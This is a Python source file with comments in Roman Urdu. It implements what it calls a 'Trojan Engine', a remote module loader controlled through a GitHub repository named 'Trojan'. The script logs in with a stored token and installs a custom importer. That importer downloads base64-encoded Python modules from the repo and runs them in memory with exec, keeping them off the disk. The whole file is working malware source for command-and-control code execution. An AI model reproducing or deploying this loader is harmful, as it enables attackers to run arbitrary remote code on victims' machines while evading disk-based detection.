import base64
import github3
import importlib
import json
import random
import sys
import time

# STEP 1: GitHub se mahfooz connection banana
def github_connect():
    try:
        # Aapke folder mein maujood token file ko parha ja raha hai
        with open('mytoken.txt', 'r') as f:
            token = f.read().strip()
    except FileNotFoundError:
        print("[-] Error: 'mytoken.txt' file nahi mili! Pehle ye file banayein.")
        sys.exit()

    # Aapka GitHub Username aur Repository Name yahan set kar diya hai
    username = 'Uzair1179'
    repository = 'Trojan'
    
    # GitHub par login ho raha hai
    session = github3.login(token=token)
    return session.repository(username, repository)

# STEP 2: GitHub se kisi bhi file ka raw data/code uthana
def get_file_contents(dirname, module_name, repo):
    try:
        file_path = f"{dirname}/{module_name}"
        file_content = repo.file_contents(file_path)
        return file_content.content
    except Exception as e:
        print(f"[-] File nahi mil saki: {dirname}/{module_name}")
        return None

# STEP 3 & 4: Custom Loader jo internet se code download karke RAM mein chalayega
class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print(f"[*] GitHub se module dhoonda ja raha hai: {name}")
        self.repo = github_connect()
        
        # 'modules' folder se aapki python file (jaise dirlister.py) uthayega
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        
        if new_library is not None:
            # GitHub ka data base64 mein hota hai, usay asli text mein convert kiya ja raha hai
            self.current_module_code = base64.b64decode(new_library).decode('utf-8')
            return self
        return None

    def load_module(self, name):
        # Bina hard disk par save kiye, direct RAM ke andar memory space banana
        spec = importlib.util.spec_from_loader(name, loader=None)
        new_module = importlib.util.module_from_spec(spec)
        sys.modules[name] = new_module
        
        # RAM ke us hissay mein code ko execute (chalu) kar dena
        exec(self.current_module_code, new_module.__dict__)
        return new_module

# MAIN RUNNER: Trojan ko active karne ka tareeqa
if __name__ == '__main__':
    print("[*] Trojan Engine chalu ho raha hai...")
    
    # Python ke default importer mein apna custom GitImporter add karna
    sys.meta_path.append(GitImporter())
    
    # Test karne ke liye ke kya ye sahi kaam kar raha hai
    # (Yaad rahe ke aapke GitHub par 'modules/dirlister.py' ya 'modules/environment.py' ka hona zaroori hai)
    try:
        import dirlister
        print("[+] Module kamyabi se RAM mein import ho gaya!")
        # Agar dirlister mein 'run' function hai to usay chalayega
        result = dirlister.run()
        print(f"[+] Output:\n{result}")
    except Exception as e:
        print(f"[-] Module chalane mein masla aaya: {e}")
